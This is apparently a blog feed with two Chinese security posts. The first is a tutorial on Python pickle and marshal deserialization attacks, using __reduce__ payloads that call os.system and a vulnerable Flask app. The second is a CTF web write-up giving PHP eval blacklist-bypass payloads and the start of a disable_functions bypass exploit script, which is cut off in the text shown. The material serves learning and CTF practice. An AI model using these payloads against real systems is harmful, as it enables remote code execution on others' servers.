    <content type="html"><![CDATA[<h1 id="Python反序列化漏洞">Python反序列化漏洞</h1><p>这是关于Python语言相关漏洞的第三篇：反序列化漏洞。学过PHP反序列化漏洞之后，肯定知道关于PHP反序列化各式各样的利用方式，比如POP链构造，Phar反序列化，原生类反序列化以及字符逃逸等等，Python相对而言没有PHP那么灵活，关于反序列化漏洞的话比较容易理解，主要涉及这么几个概念：pickle，pvm，<code>__reduce__</code>魔术方法。</p><p>K0rz3n师傅的文章已经讲的极为透彻了，我就搬运总结学习一下。</p><h2 id="0x01-python序列化和反序列化">0x01 python序列化和反序列化</h2><h3 id="序列化">序列化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name = <span class="string">&quot;K0rz3n&quot;</span></span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Hello ! My friends&quot;</span></span><br><span class="line"></span><br><span class="line">a=People()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line"><span class="keyword">print</span> c</span><br></pre></td></tr></table></figure><p>python3的输出：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103202644.png" alt=""></p><p>python2的输出：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103202846.png" alt=""></p><p>虽然看起来有点难理解，但是还是可以清楚地看到我们对象的属性 name ca01h，我们对象所属的类 people 都已近存储在里面了。</p><h3 id="反序列化">反序列化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name = <span class="string">&quot;K0rz3n&quot;</span></span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Hello ! My friends&quot;</span></span><br><span class="line"></span><br><span class="line">a=People()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line">d = pickle.loads(c)</span><br><span class="line">d.say()</span><br></pre></td></tr></table></figure><p>无论python2还是python3，输出的都是<code>Hello ! My friends</code>，也就是说我们成功通过反序列化的方式恢复了之前我们序列化进去的类对象并成功的执行了对象的方法。</p><h2 id="0x02-反序列化漏洞">0x02 反序列化漏洞</h2><h3 id="漏洞常见出现地方">漏洞常见出现地方</h3><p><strong>1.通常在解析认证token，session的时候</strong></p><p>现在很多web都使用redis、mongodb、memcached等来存储session等状态信息。</p><p><strong>2.可能将对象Pickle后存储成磁盘文件。</strong></p><p><strong>3.可能将对象Pickle后在网络中传输。</strong></p><p>其实，最常见的也是最经典的也就是我们的第一点，也就是 flask 配合 redis 在服务端存储 session 的情景，这里的 session 是被 pickle 序列化进行存储的，如果你通过 cookie 进行请求 sessionid 的话，session 中的内容就会被反序列化，看似好像是没有什么问题,因为 session 是存储在 服务端的，但是终究是抵不住 redis 的未授权访问，如果出现未授权的话，我们就能通过 set 设置自己的 session ,然后通过设置 cookie 去请求 session 的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的。</p><h3 id="漏洞利用方式">漏洞利用方式</h3><p>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发<code>__reduce__()</code>函数从而触发恶意代码。</p><p>简单说明一下<code>__reduce__()</code>函数：将一个数据集合（链表，元组等）中的所有数据进行下列操作：用传给 reduce 中的函数 function（有两个参数）先对集合中的第 1、2 个元素进行操作，得到的结果再与第三个数据用 function 函数运算，最后得到一个结果。</p><p>show code</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        a = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line">a = A()</span><br><span class="line">test = pickle.dumps(a)</span><br><span class="line"><span class="keyword">print</span> test</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103204054.png" alt=""></p><p>稍微解释一下这几个指令：</p><ul><li>S : 后面跟的是字符串</li><li>( ：作为命令执行到哪里的一个标记</li><li>t ：将从 t 到标记的全部元素组合成一个元祖，然后放入栈中</li><li>c ：定义模块名和类名（模块名和类名之间使用回车分隔）</li><li>R ：从栈中取出可调用函数以及元祖形式的参数来执行，并把结果放回栈中</li><li>. ：点号是结束符</li></ul><p>另外p0 p1 p2 p3只是标签，对命令我们的payload没有任何影响。</p><p>我们让上面这个结果进行反序列化看一下结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        a = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line">a = A()</span><br><span class="line">test = pickle.dumps(a)</span><br><span class="line">pickle.loads(test)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103204400.png" alt=""></p><p>再来看一个最简单的利用方式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user = base64.b64decode(request.cookies.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        username = user[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        username = <span class="string">&quot;Guest&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello %s&quot;</span> % username</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>很明显，反序列化的参数是可控的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params">object</span>):</span></span><br><span class="line">     <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">             <span class="keyword">return</span> (os.system,(<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line">      </span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)</span><br></pre></td></tr></table></figure><h2 id="0x03-Marshal反序列化">0x03 Marshal反序列化</h2><p>现在看看还有啥别的序列化库。由于<code>pickle</code>不能序列化code对象，所以在python2.6后新增<code>marshal</code>来处理code对象的序列化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle,builtins,pickletools,base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> fib(n<span class="number">-1</span>) + fib(n<span class="number">-2</span>)</span><br><span class="line">    <span class="keyword">print</span> (fib(<span class="number">5</span>))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pickle.dumps(foo.__code__)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.__code__))</span><br><span class="line">print(code_serialized)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103205604.png" alt=""></p><p>好，现在我们需要让这段代码在反序列化的时候得到执行，那我们还能不能直接使用 <code>__reduce__</code> 呢？好像不行，因为 reduce 是利用调用某个 callable 并传递参数来执行的，而我们这个函数本身就是一个 callable ，我们需要执行它，而不是将他作为某个函数的参数，这个时候就需要自己构造opcode。</p><p>这里也用到了 Python 的一个面向对象的特性，Python 能通过 types.FunctionTyle(func_code,globals(),’’)() 来动态地创建匿名函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle,builtins,pickletools,base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> fib(n<span class="number">-1</span>) + fib(n<span class="number">-2</span>)</span><br><span class="line">    <span class="keyword">print</span> (fib(<span class="number">5</span>))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pickle.dumps(foo.__code__)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.__code__))</span><br><span class="line">code_unserialized = marshal.loads(base64.b64decode(code_serialized))</span><br><span class="line">code_unserialized = types.FunctionType(code_unserialized, globals(), <span class="string">&#x27;&#x27;</span>)()</span><br><span class="line">print(code_unserialized)</span><br></pre></td></tr></table></figure><p>那我们现在的任务就是如何通过 PVM 操作码来构造出这个东西的执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ctypes</span><br><span class="line">FunctionType</span><br><span class="line">(cmarshal</span><br><span class="line">loads</span><br><span class="line">(cbase64</span><br><span class="line">b64decode</span><br><span class="line">(S&#39;YwAAA...&#39;           #code对象序列化编码</span><br><span class="line">tRtRc__builtin__</span><br><span class="line">globals</span><br><span class="line">(tRS&#39;&#39;</span><br><span class="line">tR(tR.</span><br></pre></td></tr></table></figure><p>利用方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">return</span> os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo()))</span><br><span class="line">print(code_serialized)</span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103211313.png" alt=""></p><p>在pickle下尝试执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;&quot;&quot;ctypes</span></span><br><span class="line"><span class="string">FunctionType</span></span><br><span class="line"><span class="string">(cmarshal</span></span><br><span class="line"><span class="string">loads</span></span><br><span class="line"><span class="string">(cbase64</span></span><br><span class="line"><span class="string">b64decode</span></span><br><span class="line"><span class="string">(S&#x27;6QAAAAA=&#x27;   #whomai</span></span><br><span class="line"><span class="string">tRtRc__builtin__</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;&#x27;</span></span><br><span class="line"><span class="string">tR(tR.&quot;&quot;&quot;</span></span><br><span class="line">data = pickle.loads(payload)</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure><p>于是又有一个黑名单绕过执行函数的方式。</p><h2 id="0x04-Others">0x04 Others</h2><p>当然还有一些其他的反序列化方式，例如PyYaml，Jsonpickle，Shelve，这里就不多赘述了。</p><p><a href="https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://misakikata.github.io/2020/04/python-反序列化/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Python反序列化漏洞&quot;&gt;Python反序列化漏洞&lt;/h1&gt;
&lt;p&gt;这是关于Python语言相关漏洞的第三篇：反序列化漏洞。学过PHP反序列化漏洞之后，肯定知道关于PHP反序列化各式各样的利用方式，比如POP链构造，Phar反序列化，原生类反序列化以及字符逃逸等
      
    
    </summary>
    
    
      <category term="Web基础安全学习" scheme="http://ca0y1h.top/categories/Web%E5%9F%BA%E7%A1%80%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="反序列化" scheme="http://ca0y1h.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>BMZCTF2020-Web-WriteUp</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/31.BMZCTF2020-Web-WriteUp/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/31.BMZCTF2020-Web-WriteUp/</id>
    <published>2021-01-03T09:12:56.000Z</published>
    <updated>2021-01-03T09:13:21.148Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BMZCTF2020-Web-WriteUp">BMZCTF2020 Web WriteUp</h1><h2 id="0x01-easyeval">0x01 easyeval</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$cmd=$_POST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">$cmd=htmlspecialchars($cmd);</span><br><span class="line">$black_list=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;var&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;scan&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;pcntl&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;link&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;current&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;contents&#x27;</span>);</span><br><span class="line">$cmd = str_ireplace($black_list,<span class="string">&quot;BMZCTF&quot;</span>,$cmd);</span><br><span class="line"><span class="keyword">eval</span>($cmd);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>拼接绕过</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd&#x3D;(&#39;s&#39;.&#39;y&#39;.&#39;s&#39;.&#39;t&#39;.&#39;e&#39;.&#39;m&#39;)(&quot;cat &#x2F;flag&quot;);</span><br></pre></td></tr></table></figure><p><strong>十六进制绕过</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd&#x3D;hex2bin(&#39;73797374656d&#39;)(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure><p><strong>异或</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">char = string.printable</span><br><span class="line">cmd = <span class="string">&#x27;system&#x27;</span></span><br><span class="line">tmp1,tmp2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> res <span class="keyword">in</span> cmd:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> char:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> char:</span><br><span class="line">            <span class="keyword">if</span>(ord(i)^ord(j) == ord(res)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(tmp1,tmp2)</span><br></pre></td></tr></table></figure><p><strong>取反</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line">$system=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line">$command=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.urlencode(~$system).<span class="string">&#x27;)(~&#x27;</span>.urlencode(~$command).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="0x02-easyphp">0x02 easyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$cmd=$_POST[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(strlen($cmd) &gt; <span class="number">25</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>($cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看一下phpinfo的内容，PHP版本7.3，禁掉了很多函数。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201230185957.png" alt=""></p><p>蚁剑的绕过方式都失败了，参考脚本https://xz.aliyun.com/t/8355</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$a = str_repeat(<span class="string">&quot;T&quot;</span>, <span class="number">120</span> * <span class="number">1024</span> * <span class="number">1024</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2s</span>(<span class="params">&amp;$a, $p, $i, $x = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt; $x;$j++) &#123;</span><br><span class="line">        $a[$p + $j] = chr($i &amp; <span class="number">0xff</span>);</span><br><span class="line">        $i &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 